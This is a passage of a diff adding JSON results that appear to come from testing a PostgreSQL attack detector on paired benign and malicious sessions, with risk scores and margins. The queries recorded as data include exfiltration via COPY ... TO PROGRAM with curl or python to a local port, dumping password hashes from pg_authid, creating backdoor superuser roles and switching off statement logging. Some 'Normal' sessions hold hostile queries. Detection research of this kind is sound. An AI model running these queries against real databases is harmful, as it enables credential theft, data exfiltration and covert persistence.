+            "os_risk": 0.5822,
+            "os_status": "benign",
+            "cross_risk": 0.5521,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0469,
+          "cross_margin": 0.5521,
+          "margin_widened": 0.5052,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "100558",
+            "filename": "enriched_session_100558_Normal.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 3,
+            "file_count": 51,
+            "endpoint_count": 1,
+            "os_risk": 0.0,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "42230",
+            "filename": "enriched_session_42230_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 3,
+            "file_count": 51,
+            "endpoint_count": 1,
+            "os_risk": 0.0,
+            "os_status": "benign",
+            "cross_risk": 0.0001,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 0.9245,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.0001,
+          "margin_widened": 0.0001,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "109851",
+            "filename": "enriched_session_109851_Normal.graphml",
+            "query": "SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%';",
+            "tables": [
+              "('Table', 'pg_class')"
+            ],
+            "proc_count": 1,
+            "file_count": 13,
+            "endpoint_count": 0,
+            "os_risk": 0.5563,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "100735",
+            "filename": "enriched_session_100735_OS_Privilege_Escalation.graphml",
+            "query": "COPY (SELECT rolname, rolpassword FROM pg_authid) TO '/tmp/sqli_dump.txt';",
+            "tables": [
+              "('Table', 'pg_authid')"
+            ],
+            "proc_count": 1,
+            "file_count": 13,
+            "endpoint_count": 0,
+            "os_risk": 0.6291,
+            "os_status": "benign",
+            "cross_risk": 0.6856,
+            "cross_status": "alert",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 0.5294,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0728,
+          "cross_margin": 0.6856,
+          "margin_widened": 0.6128,
+          "os_discriminated": false,
+          "cross_discriminated": true
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "109854",
+            "filename": "enriched_session_109854_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5822,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "100702",
+            "filename": "enriched_session_100702_OS_Privilege_Escalation.graphml",
+            "query": "CREATE ROLE hacker WITH SUPERUSER LOGIN PASSWORD 'hacked';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5576,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0246,
+          "cross_margin": 0.549,
+          "margin_widened": 0.5244,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "110861",
+            "filename": "enriched_session_110861_Normal.graphml",
+            "query": "SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%';",
+            "tables": [
+              "('Table', 'pg_class')"
+            ],
+            "proc_count": 1,
+            "file_count": 19,
+            "endpoint_count": 0,
+            "os_risk": 0.5577,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "80807",
+            "filename": "enriched_session_80807_Data_Exfiltration.graphml",
+            "query": "VACUUM FULL pgbench_accounts;",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 19,
+            "endpoint_count": 0,
+            "os_risk": 0.5507,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 0.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.007,
+          "cross_margin": 0.549,
+          "margin_widened": 0.542,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "110864",
+            "filename": "enriched_session_110864_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5695,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "100704",
+            "filename": "enriched_session_100704_OS_Privilege_Escalation.graphml",
+            "query": "SELECT set_config('log_statement', 'none', false);",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5511,
+            "os_status": "benign",
+            "cross_risk": 0.7477,
+            "cross_status": "alert",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0184,
+          "cross_margin": 0.7477,
+          "margin_widened": 0.7293,
+          "os_discriminated": false,
+          "cross_discriminated": true
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "111878",
+            "filename": "enriched_session_111878_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5775,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "100748",
+            "filename": "enriched_session_100748_OS_Privilege_Escalation.graphml",
+            "query": "CREATE ROLE sqli_admin SUPERUSER LOGIN PASSWORD 'hacked';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5608,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0167,
+          "cross_margin": 0.549,
+          "margin_widened": 0.5323,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "112504",
+            "filename": "enriched_session_112504_Normal.graphml",
+            "query": "VACUUM FULL pgbench_accounts;",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 26,
+            "endpoint_count": 0,
+            "os_risk": 0.5352,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "113532",
+            "filename": "enriched_session_113532_Data_Exfiltration.graphml",
+            "query": "VACUUM FULL pgbench_accounts;",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 26,
+            "endpoint_count": 0,
+            "os_risk": 0.5305,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 0.0196,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0047,
+          "cross_margin": 0.0,
+          "margin_widened": -0.0047,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "112899",
+            "filename": "enriched_session_112899_Normal.graphml",
+            "query": "SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%';",
+            "tables": [
+              "('Table', 'pg_class')"
+            ],
+            "proc_count": 1,
+            "file_count": 21,
+            "endpoint_count": 0,
+            "os_risk": 0.6292,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "97117",
+            "filename": "enriched_session_97117_Data_Exfiltration.graphml",
+            "query": "VACUUM FULL pgbench_accounts;",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 21,
+            "endpoint_count": 0,
+            "os_risk": 0.5676,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 0.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0616,
+          "cross_margin": 0.549,
+          "margin_widened": 0.4874,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "112902",
+            "filename": "enriched_session_112902_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5775,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "109508",
+            "filename": "enriched_session_109508_Data_Exfiltration.graphml",
+            "query": "CREATE EXTENSION IF NOT EXISTS pgcrypto;",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5682,
+            "os_status": "benign",
+            "cross_risk": 0.5493,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0093,
+          "cross_margin": 0.5493,
+          "margin_widened": 0.54,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "113908",
+            "filename": "enriched_session_113908_Normal.graphml",
+            "query": "SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%';",
+            "tables": [
+              "('Table', 'pg_class')"
+            ],
+            "proc_count": 1,
+            "file_count": 13,
+            "endpoint_count": 0,
+            "os_risk": 0.5498,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "110005",
+            "filename": "enriched_session_110005_OS_Privilege_Escalation.graphml",
+            "query": "UPDATE pgbench_tellers SET tbalance = 99999 WHERE tid = 1;",
+            "tables": [
+              "('Table', 'pgbench_tellers')"
+            ],
+            "proc_count": 1,
+            "file_count": 13,
+            "endpoint_count": 0,
+            "os_risk": 0.6288,
+            "os_status": "benign",
+            "cross_risk": 0.7328,
+            "cross_status": "alert",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 0.5294,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.079,
+          "cross_margin": 0.7328,
+          "margin_widened": 0.6538,
+          "os_discriminated": false,
+          "cross_discriminated": true
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "113913",
+            "filename": "enriched_session_113913_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5535,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "110001",
+            "filename": "enriched_session_110001_OS_Privilege_Escalation.graphml",
+            "query": "CREATE ROLE hacker WITH SUPERUSER LOGIN PASSWORD 'hacked';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5695,
+            "os_status": "benign",
+            "cross_risk": 0.5495,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.016,
+          "cross_margin": 0.5495,
+          "margin_widened": 0.5335,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "114870",
+            "filename": "enriched_session_114870_Normal.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'python3 -c  import urllib.request, sys; req = urllib.request.Request(  http://127.0.0.1:9090  , data=sys.stdin.read().encode(), method=  POST  ); urllib.request.urlopen(req)  > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 3,
+            "file_count": 119,
+            "endpoint_count": 1,
+            "os_risk": 0.462,
+            "os_status": "benign",
+            "cross_risk": 0.6456,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "100499",
+            "filename": "enriched_session_100499_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'python3 -c  import urllib.request, sys; req = urllib.request.Request(  http://127.0.0.1:9090  , data=sys.stdin.read().encode(), method=  POST  ); urllib.request.urlopen(req)  > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 3,
+            "file_count": 119,
+            "endpoint_count": 1,
+            "os_risk": 0.7316,
+            "os_status": "alert",
+            "cross_risk": 0.7175,
+            "cross_status": "alert",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 0.9669,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.2696,
+          "cross_margin": 0.0719,
+          "margin_widened": -0.1977,
+          "os_discriminated": true,
+          "cross_discriminated": true
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "114919",
+            "filename": "enriched_session_114919_Normal.graphml",
+            "query": "SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%';",
+            "tables": [
+              "('Table', 'pg_class')"
+            ],
+            "proc_count": 1,
+            "file_count": 13,
+            "endpoint_count": 0,
+            "os_risk": 0.6292,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "110034",
+            "filename": "enriched_session_110034_OS_Privilege_Escalation.graphml",
+            "query": "COPY (SELECT rolname, rolpassword FROM pg_authid) TO '/tmp/sqli_dump.txt';",
+            "tables": [
+              "('Table', 'pg_authid')"
+            ],
+            "proc_count": 1,
+            "file_count": 13,
+            "endpoint_count": 0,
+            "os_risk": 0.5917,
+            "os_status": "benign",
+            "cross_risk": 0.6325,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 0.5294,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0375,
+          "cross_margin": 0.6325,
+          "margin_widened": 0.595,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "114923",
+            "filename": "enriched_session_114923_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5497,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "110003",
+            "filename": "enriched_session_110003_OS_Privilege_Escalation.graphml",
+            "query": "SELECT set_config('log_statement', 'none', false);",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5822,
+            "os_status": "benign",
+            "cross_risk": 0.7492,
+            "cross_status": "alert",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0325,
+          "cross_margin": 0.7492,
+          "margin_widened": 0.7167,
+          "os_discriminated": false,
+          "cross_discriminated": true
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "115928",
+            "filename": "enriched_session_115928_Normal.graphml",
+            "query": "SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%';",
+            "tables": [
+              "('Table', 'pg_class')"
+            ],
+            "proc_count": 1,
+            "file_count": 13,
+            "endpoint_count": 0,
+            "os_risk": 0.5683,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "112029",
+            "filename": "enriched_session_112029_OS_Privilege_Escalation.graphml",
+            "query": "UPDATE pgbench_tellers SET tbalance = 99999 WHERE tid = 1;",
+            "tables": [
+              "('Table', 'pgbench_tellers')"
+            ],
+            "proc_count": 1,
+            "file_count": 13,
+            "endpoint_count": 0,
+            "os_risk": 0.5563,
+            "os_status": "benign",
+            "cross_risk": 0.6951,
+            "cross_status": "alert",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 0.5294,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.012,
+          "cross_margin": 0.6951,
+          "margin_widened": 0.6831,
+          "os_discriminated": false,
+          "cross_discriminated": true
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "115931",
+            "filename": "enriched_session_115931_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5507,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "110047",
+            "filename": "enriched_session_110047_OS_Privilege_Escalation.graphml",
+            "query": "CREATE ROLE sqli_admin SUPERUSER LOGIN PASSWORD 'hacked';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5822,
+            "os_status": "benign",
+            "cross_risk": 0.5517,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0315,
+          "cross_margin": 0.5517,
+          "margin_widened": 0.5202,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "116558",
+            "filename": "enriched_session_116558_Normal.graphml",
+            "query": "VACUUM FULL pgbench_accounts;",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 23,
+            "endpoint_count": 0,
+            "os_risk": 0.5335,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "108411",
+            "filename": "enriched_session_108411_Data_Exfiltration.graphml",
+            "query": "VACUUM FULL pgbench_accounts;",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 23,
+            "endpoint_count": 0,
+            "os_risk": 0.5342,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 0.0222,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0007,
+          "cross_margin": 0.0,
+          "margin_widened": -0.0007,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "116949",
+            "filename": "enriched_session_116949_Normal.graphml",
+            "query": "SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%';",
+            "tables": [
+              "('Table', 'pg_class')"
+            ],
+            "proc_count": 1,
+            "file_count": 13,
+            "endpoint_count": 0,
+            "os_risk": 0.5777,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "112058",
+            "filename": "enriched_session_112058_OS_Privilege_Escalation.graphml",
+            "query": "COPY (SELECT rolname, rolpassword FROM pg_authid) TO '/tmp/sqli_dump.txt';",
+            "tables": [
+              "('Table', 'pg_authid')"
+            ],
+            "proc_count": 1,
+            "file_count": 13,
+            "endpoint_count": 0,
+            "os_risk": 0.5592,
+            "os_status": "benign",
+            "cross_risk": 0.6268,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 0.5294,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0185,
+          "cross_margin": 0.6268,
+          "margin_widened": 0.6083,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "116952",
+            "filename": "enriched_session_116952_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5918,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "110518",
+            "filename": "enriched_session_110518_Data_Exfiltration.graphml",
+            "query": "CREATE EXTENSION IF NOT EXISTS pgcrypto;",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5558,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.036,
+          "cross_margin": 0.549,
+          "margin_widened": 0.513,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "117583",
+            "filename": "enriched_session_117583_Normal.graphml",
+            "query": "VACUUM FULL pgbench_accounts;",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 24,
+            "endpoint_count": 0,
+            "os_risk": 0.5303,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "109477",
+            "filename": "enriched_session_109477_Data_Exfiltration.graphml",
+            "query": "VACUUM FULL pgbench_accounts;",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 24,
+            "endpoint_count": 0,
+            "os_risk": 0.5555,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 0.0435,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0252,
+          "cross_margin": 0.0,
+          "margin_widened": -0.0252,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "117962",
+            "filename": "enriched_session_117962_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5497,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "111015",
+            "filename": "enriched_session_111015_OS_Privilege_Escalation.graphml",
+            "query": "CREATE ROLE hacker WITH SUPERUSER LOGIN PASSWORD 'hacked';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.6291,
+            "os_status": "benign",
+            "cross_risk": 0.5552,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0794,
+          "cross_margin": 0.5552,
+          "margin_widened": 0.4758,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "118591",
+            "filename": "enriched_session_118591_Normal.graphml",
+            "query": "VACUUM FULL pgbench_accounts;",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 24,
+            "endpoint_count": 0,
+            "os_risk": 0.5519,
+            "os_status": "benign",
+            "cross_risk": 0.5519,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "110487",
+            "filename": "enriched_session_110487_Data_Exfiltration.graphml",
+            "query": "VACUUM FULL pgbench_accounts;",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 24,
+            "endpoint_count": 0,
+            "os_risk": 0.5299,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 0.0213,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.022,
+          "cross_margin": -0.0029,
+          "margin_widened": -0.0249,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "118971",
+            "filename": "enriched_session_118971_Normal.graphml",
+            "query": "SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%';",
+            "tables": [
+              "('Table', 'pg_class')"
+            ],
+            "proc_count": 1,
+            "file_count": 13,
+            "endpoint_count": 0,
+            "os_risk": 0.5577,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "114064",
+            "filename": "enriched_session_114064_OS_Privilege_Escalation.graphml",
+            "query": "UPDATE pgbench_tellers SET tbalance = 99999 WHERE tid = 1;",
+            "tables": [
+              "('Table', 'pgbench_tellers')"
+            ],
+            "proc_count": 1,
+            "file_count": 13,
+            "endpoint_count": 0,
+            "os_risk": 0.5513,
+            "os_status": "benign",
+            "cross_risk": 0.7077,
+            "cross_status": "alert",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 0.5294,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0064,
+          "cross_margin": 0.7077,
+          "margin_widened": 0.7013,
+          "os_discriminated": false,
+          "cross_discriminated": true
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "118974",
+            "filename": "enriched_session_118974_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5511,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "111017",
+            "filename": "enriched_session_111017_OS_Privilege_Escalation.graphml",
+            "query": "SELECT set_config('log_statement', 'none', false);",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.5822,
+            "os_status": "benign",
+            "cross_risk": 0.7492,
+            "cross_status": "alert",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0311,
+          "cross_margin": 0.7492,
+          "margin_widened": 0.7181,
+          "os_discriminated": false,
+          "cross_discriminated": true
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "101184",
+            "filename": "enriched_session_101184_Normal.graphml",
+            "query": "VACUUM FULL pgbench_accounts;",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 22,
+            "endpoint_count": 0,
+            "os_risk": 0.5326,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "115552",
+            "filename": "enriched_session_115552_Data_Exfiltration.graphml",
+            "query": "VACUUM FULL pgbench_accounts;",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 22,
+            "endpoint_count": 0,
